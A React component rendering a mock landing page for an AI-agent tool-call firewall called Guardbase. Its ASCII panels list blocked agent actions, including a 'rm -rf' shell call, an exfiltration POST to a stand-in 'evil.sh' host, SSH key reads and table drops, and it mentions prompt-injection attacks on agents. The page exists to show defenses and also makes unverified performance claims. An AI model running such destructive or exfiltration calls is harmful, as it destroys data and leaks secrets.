import React from 'react';
import {
  ArrowUpRight,
  Copy,
} from 'lucide-react';
import type { ShowcasePageState } from '../useShowcasePageState';

interface Props {
  state: ShowcasePageState;
  onCopyText: (text: string, label: string) => void;
}

export const GuardbaseSecurityPage: React.FC<Props> = ({ state, onCopyText }) => {
  const { asciiMode, setAsciiMode, selectedAttackIdx, setSelectedAttackIdx, sdkLang, setSdkLang, scanRunning, palette, bg, surface, action, actionTextColor, triggerSecurityScan, ATTACK_SCENARIOS, SDK_SNIPPETS } = state;
  return (
    <>
        <article
          className="rounded-2xl border border-white/15 overflow-hidden transition-colors duration-200 shadow-2xl"
          style={{ backgroundColor: bg.hex, color: surface.hex }}
        >
          {/* Website 02 Top Bar */}
          <header
            className="flex items-center justify-between gap-8 px-6 lg:px-12 py-5 border-b"
            style={{ borderColor: `${surface.hex}18` }}
          >
            <span className="font-display text-xl font-bold tracking-tight whitespace-nowrap shrink-0">
              {palette.brandName}
            </span>
            <nav className="hidden md:flex items-center gap-8 text-sm font-medium opacity-85">
              <a href="#p2-simulator" className="hover:underline whitespace-nowrap shrink-0">Attack Simulator</a>
              <a href="#p2-telemetry" className="hover:underline whitespace-nowrap shrink-0">Live Telemetry</a>
              <a href="#p2-sdk" className="hover:underline whitespace-nowrap shrink-0">SDK Integration</a>
              <a href="#p2-editions" className="hover:underline whitespace-nowrap shrink-0">Open Source</a>
            </nav>
            <button
              type="button"
              onClick={triggerSecurityScan}
              style={{ backgroundColor: action.hex, color: actionTextColor }}
              className="px-4 py-2 rounded-lg text-xs font-semibold whitespace-nowrap shrink-0 transition-transform active:scale-95"
            >
              {scanRunning ? 'Scanning Agent Graph...' : 'Run Security Audit'}
            </button>
          </header>

          <div className="px-6 lg:px-12 py-10 lg:py-14 space-y-16">
            {/* Section 1: Hero with Interactive ASCII Shader Mode Switcher */}
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-10 items-center">
              <div className="lg:col-span-7 space-y-6">
                <div className="text-xs font-mono opacity-75">
                  ZERO-TRUST AGENT FIREWALL · MCP &amp; TOOL-CALL BOUNDARY PROTECTION
                </div>
                <h1 className="font-display text-4xl sm:text-6xl font-bold tracking-tight text-balance leading-[1.05]">
                  AI{' '}
                  <span style={{ color: action.hex }}>deserves</span>{' '}
                  the same security{' '}
                  <span style={{ color: action.hex }}>as software.</span>
                </h1>
                <p className="text-base sm:text-lg opacity-85 max-w-xl leading-relaxed">
                  Monitor how autonomous agents behave, intercept prompt-injection payloads before tool execution, and enforce deterministic Wasm policies in under 4ms.
                </p>

                <div className="flex flex-wrap items-center gap-3 pt-2">
                  <button
                    type="button"
                    onClick={() => {
                      triggerSecurityScan();
                      onCopyText('npx @guardbase/cli init --zero-trust', 'Guardbase CLI installer');
                    }}
                    style={{ backgroundColor: action.hex, color: actionTextColor }}
                    className="px-5 py-3 rounded-lg text-sm font-semibold flex items-center gap-2 whitespace-nowrap shrink-0"
                  >
                    <span>Install Open-Source Firewall</span>
                    <ArrowUpRight className="w-4 h-4" />
                  </button>

                  <button
                    type="button"
                    onClick={() =>
                      setSelectedAttackIdx((prev) => (prev + 1) % ATTACK_SCENARIOS.length)
                    }
                    style={{ borderColor: `${surface.hex}35`, color: surface.hex }}
                    className="px-4 py-3 rounded-lg text-sm font-medium border hover:opacity-80 whitespace-nowrap shrink-0"
                  >
                    Simulate Live Attack →
                  </button>
                </div>
              </div>

              {/* Right 5 Cols: Interactive ASCII Shader with Mode Buttons */}
              <div
                className="lg:col-span-5 rounded-2xl p-2 border"
                style={{
                  borderColor: `${surface.hex}22`,
                  backgroundColor: `${surface.hex}06`
                }}
              >
                <div
                  className="rounded-lg p-5 font-mono text-[11px] leading-[1.15] overflow-hidden"
                  style={{
                    backgroundColor: `${action.hex}12`,
                    color: action.hex
                  }}
                >
                  <div className="flex flex-wrap items-center justify-between gap-2 text-xs pb-3 mb-3 border-b" style={{ borderColor: `${action.hex}30`, color: surface.hex }}>
                    <span>ASCII_VISUALIZER</span>
                    <div className="flex items-center gap-1">
                      {(['mountains', 'firewall', 'matrix'] as const).map((mode) => (
                        <button
                          key={mode}
                          type="button"
                          onClick={() => setAsciiMode(mode)}
                          style={{
                            backgroundColor: asciiMode === mode ? action.hex : 'transparent',
                            color: asciiMode === mode ? actionTextColor : surface.hex
                          }}
                          className="px-2 py-0.5 rounded text-[10px] uppercase font-semibold"
                        >
                          {mode}
                        </button>
                      ))}
                    </div>
                  </div>

                  {asciiMode === 'mountains' && (
                    <pre className="overflow-x-hidden font-mono text-[10px] sm:text-[11px] leading-tight select-none">
{`                  /\\
                 /**\\          /\\
                /****\\   /\\   /##\\
               /******\\ /**\\ /####\\
        /\\    /********\\****/######\\
       /**\\  /**********************\\
      /****\\/************************\\
     /********************************\\
    /..::**************************::..\\
   /....::::********************::::....\\`}
                    </pre>
                  )}
                  {asciiMode === 'firewall' && (
                    <pre className="overflow-x-hidden font-mono text-[10px] sm:text-[11px] leading-tight select-none">
{`  [AGENT_PROMPT] ──► ║ W A S M   G A T E ║ ──► [SAFE_TOOL]
  [INJECTION_01] ──► ║ ✕ BLOCKED (1.9ms) ║
  [SQL_DROP_TBL] ──► ║ ✕ BLOCKED (2.1ms) ║
  [SSH_KEY_READ] ──► ║ ✕ BLOCKED (2.8ms) ║
  [STRIPE_LIST ] ──► ║ ✓ ALLOWED (3.1ms) ║ ──► [200 OK]
  ═══════════════════╩═══════════════════╩══════════════`}
                    </pre>
                  )}
                  {asciiMode === 'matrix' && (
                    <pre className="overflow-x-hidden font-mono text-[10px] sm:text-[11px] leading-tight select-none">
{`  0x01  ALLOW  mcp.github.get_issue      [01.4ms]  ✓
  0x02  BLOCK  mcp.bash.exec("rm -rf")   [00.9ms]  ✕
  0x03  ALLOW  mcp.postgres.select_rows  [02.2ms]  ✓
  0x04  BLOCK  http.post("evil.sh/exfil")[01.7ms]  ✕
  0x05  ALLOW  mcp.slack.post_summary    [03.0ms]  ✓
  0x06  AUDIT  sha256:9f86d081884c7d659a2feaa0c55ad015`}
                    </pre>
                  )}

                  <div className="mt-4 pt-3 border-t flex items-center justify-between text-xs tabular-nums" style={{ borderColor: `${action.hex}30`, color: surface.hex }}>
                    <span>99.989% Threat Interception</span>
                    <span>P99 Latency: 3.1ms</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Section 2: Interactive Prompt-Injection & Tool-Call Attack Simulator */}
            <section id="p2-simulator" className="pt-10 border-t space-y-6" style={{ borderColor: `${surface.hex}18` }}>
              <div className="flex flex-wrap items-center justify-between gap-4">
                <div>
                  <div className="text-xs font-mono opacity-75">01. INTERACTIVE ATTACK &amp; POLICY SANDBOX</div>
                  <h2 className="mt-1 text-2xl font-display font-bold">
                    Test how Guardbase intercepts malicious agent tool calls in real time.
                  </h2>
                </div>
                <div className="flex flex-wrap gap-2">
                  {ATTACK_SCENARIOS.map((scen, idx) => (
                    <button
                      key={scen.name}
                      type="button"
                      onClick={() => setSelectedAttackIdx(idx)}
                      style={{
                        backgroundColor: selectedAttackIdx === idx ? action.hex : 'transparent',
                        color: selectedAttackIdx === idx ? actionTextColor : surface.hex,
                        borderColor: selectedAttackIdx === idx ? action.hex : `${surface.hex}30`
                      }}
                      className="px-3.5 py-2 rounded-lg border text-xs font-semibold transition-colors"
                    >
                      Scenario {idx + 1}: {scen.name.split(' ')[0]} {scen.name.split(' ')[1]}
                    </button>
                  ))}
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                <div
                  className="lg:col-span-7 rounded-xl p-5 border font-mono text-xs space-y-3"
                  style={{ borderColor: `${surface.hex}22`, backgroundColor: `${surface.hex}06` }}
                >
                  <div className="flex items-center justify-between opacity-75">
                    <span>INTERCEPTED AGENT PAYLOAD</span>
                    <span>TOOL: {ATTACK_SCENARIOS[selectedAttackIdx].tool}</span>
                  </div>
                  <div
                    className="p-4 rounded-lg border text-sm"
                    style={{ borderColor: `${surface.hex}20`, backgroundColor: bg.hex }}
                  >
                    {ATTACK_SCENARIOS[selectedAttackIdx].payload}
                  </div>
                  <div className="text-xs opacity-80">
                    Triggered Rule: <strong>{ATTACK_SCENARIOS[selectedAttackIdx].rule}</strong>
                  </div>
                </div>

                <div
                  className="lg:col-span-5 rounded-xl p-5 border flex flex-col justify-between"
                  style={{ borderColor: action.hex, backgroundColor: `${action.hex}10` }}
                >
                  <div>
                    <div className="text-xs font-mono opacity-80">FIREWALL VERDICT</div>
                    <div className="mt-2 text-2xl font-display font-bold font-mono">
                      {ATTACK_SCENARIOS[selectedAttackIdx].verdict}
                    </div>
                    <div className="mt-1 text-xs font-mono tabular-nums opacity-85">
                      Evaluated in {ATTACK_SCENARIOS[selectedAttackIdx].latency} · Zero data leaked
                    </div>
                  </div>
                  <div className="pt-4 mt-4 border-t flex items-center justify-between" style={{ borderColor: `${surface.hex}20` }}>
                    <span className="text-xs font-mono">Deterministic Wasm Sandbox</span>
                    <button
                      type="button"
                      onClick={() =>
                        onCopyText(
                          JSON.stringify(ATTACK_SCENARIOS[selectedAttackIdx], null, 2),
                          'Audit Trace JSON'
                        )
                      }
                      style={{ backgroundColor: action.hex, color: actionTextColor }}
                      className="px-3 py-1.5 rounded text-xs font-semibold"
                    >
                      Copy Trace JSON
                    </button>
                  </div>
                </div>
              </div>
            </section>

            {/* Section 3: Multi-Language SDK Code Integration */}
            <section id="p2-sdk" className="pt-10 border-t space-y-6" style={{ borderColor: `${surface.hex}18` }}>
              <div className="flex flex-wrap items-center justify-between gap-4">
                <div>
                  <div className="text-xs font-mono opacity-75">02. DROP-IN DEVELOPER SDK</div>
                  <h2 className="mt-1 text-2xl font-display font-bold">
                    Wrap any agent tool or MCP server in 6 lines of code.
                  </h2>
                </div>
                <div className="flex items-center gap-2">
                  {(['typescript', 'python', 'mcp'] as const).map((lang) => (
                    <button
                      key={lang}
                      type="button"
                      onClick={() => setSdkLang(lang)}
                      style={{
                        backgroundColor: sdkLang === lang ? surface.hex : 'transparent',
                        color: sdkLang === lang ? bg.hex : surface.hex,
                        borderColor: `${surface.hex}30`
                      }}
                      className="px-3.5 py-1.5 rounded-lg border text-xs font-mono uppercase font-semibold"
                    >
                      {lang}
                    </button>
                  ))}
                  <button
                    type="button"
                    onClick={() => onCopyText(SDK_SNIPPETS[sdkLang], `${sdkLang.toUpperCase()} snippet`)}
                    style={{ backgroundColor: action.hex, color: actionTextColor }}
                    className="px-3.5 py-1.5 rounded-lg text-xs font-semibold flex items-center gap-1.5"
                  >
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy Code</span>
                  </button>
                </div>
              </div>

              <pre
                className="rounded-xl p-5 border font-mono text-xs overflow-x-auto leading-relaxed"
                style={{ borderColor: `${surface.hex}22`, backgroundColor: `${surface.hex}09` }}
              >
                <code>{SDK_SNIPPETS[sdkLang]}</code>
              </pre>
            </section>
          </div>
        </article>
    </>
  );
};
